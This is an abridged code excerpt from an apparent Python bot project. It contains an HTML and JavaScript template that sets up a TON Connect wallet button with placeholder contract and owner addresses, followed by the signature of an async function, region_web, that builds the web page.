...
<head>
    ...
    <style>
        ...
        *,*::before, *::after {{ box-sizing: inherit; font-family: Arial, sans-serif; font-weight: 100;}}
        ...
        .happy-container {{ display: flex; flex-direction: column; }}
        .happy {{ display: flex; justify-content: space-between; }}
        .happy-inner {{ display: flex; align-items: center; }}
        #link {{ text-decoration: underline; color: var(--tg-theme-link-color); cursor: pointer; }}
...
<body>
    <div class="container">
        ...
        <div class="footer-inner">
            ...
            <div><a id="footer-link" href="{2}">{3}</a></div>
        </div>
    </div>
    <script>
        let c = 0
        ...
        let addressContractFriendly = "{4}"
        let addressOwnerRaw = "{5}"
        let stateInit = "{6}"
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({{
            manifestUrl: 'https://fereysitnerya.github.io/ferey/tonconnect-manifest.json',
            buttonRootId: 'connect',
...
async def region_web(bot, username, ENT_TID, ENT_LC, POST_ID, POST_TYPE, POST_TEXT, POST_LNK, POST_BUTTON, ENT_TYPE,
                     MEDIA_D, BASE_D, bot_username, PROJECT_TYPE='bot', address_owner_raw=None, address_contract_friendly=None, state_init=None):
    result = None
    try:
